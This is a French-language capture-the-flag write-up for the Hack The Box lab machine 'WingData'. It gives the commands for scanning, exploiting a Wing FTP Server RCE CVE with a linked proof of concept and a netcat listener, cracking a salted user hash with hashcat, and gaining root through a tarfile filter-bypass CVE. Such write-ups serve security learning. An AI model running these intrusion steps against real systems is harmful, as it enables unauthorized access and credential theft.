  # WingData

	echo "10.129.6.75 wingdata.htb" >> /etc/hosts
    echo "10.129.6.75 ftp.wingdata.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.129.6.75 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.129.6.75 -oN nmap.txt
	
Scans classiques.
Résultats :

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.66

Fuzzing web : 

    feroxbuster --silent -u http://wingdata.htb
    ffuf -u http://wingdata.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
    ffuf -u http://wingdata.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

Rien de transcendant, mais on voit un http://ftp.wingdata.htb directement sur un bouton de la page et il semble tourner sous Wing FTP Server.

Un CVE existe et inclut notre version 7.4.3 :
- https://www.sonicwall.com/fr-fr/blog/wing-ftp-server-remote-code-execution-cve-2025-47812
- https://github.com/0xcan1337/CVE-2025-47812-poC/blob/main/CVE-2025-47812-poC.py

On a bien un shell directement, en tant que wingftp : 

```
vim exp.py
python3 exp.py
nc -nvlp 9999
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Pivoting
    
On voit un utilisateur wacky dans /etc/passwd ainsi que dans /home/ entre autres. Mot de passe hashé mais impossible à casser à première vue : 

    cd /
    grep -ir "wacky"
    cat Data/1/users/wacky.xml
    
Mais on voit que WingFTP a un salt "WingFTP" par défaut et qu'il faut donc le rajouter dans le hash trouvé : 
- https://www.wftpserver.com/help/ftpserver/index.html?compression.htm

```    
    hashcat -m 1410 ./hash.txt ./rockyou.txt --username --show
    ssh wacky@wingdata.htb
    cat user.txt
``` 

## Élévation de privilèges

    sudo -l 

> (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
    
Script Python qui prend des fichiers et les extrait dans un autre dossier. 

Il y a un argument 'filter="data"' qui est censé protéger des traversées entre autres : 
- https://peps.python.org/pep-0706/#setting-a-precedent



> tar.extractall(path=staging_dir, filter="data")
    
    
Mais ce mécanisme lui-même a été contourné et possède un CVE : 
- https://access.redhat.com/security/cve/cve-2025-4517
- https://github.com/advisories/GHSA-6r6c-684h-9j7p
- https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f

```
    vim exp.py
    python3 exp.py
    scp backup_tim.tar wacky@wingdata.htb:/opt/backup_clients/backups/
    ...
    sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_tim.tar -r restore_OK
    ...
    cd .ssh
    ssh -i ~/.ssh/id_ed25519 root@wingdata.htb
    cat /root/root.txt
    
```
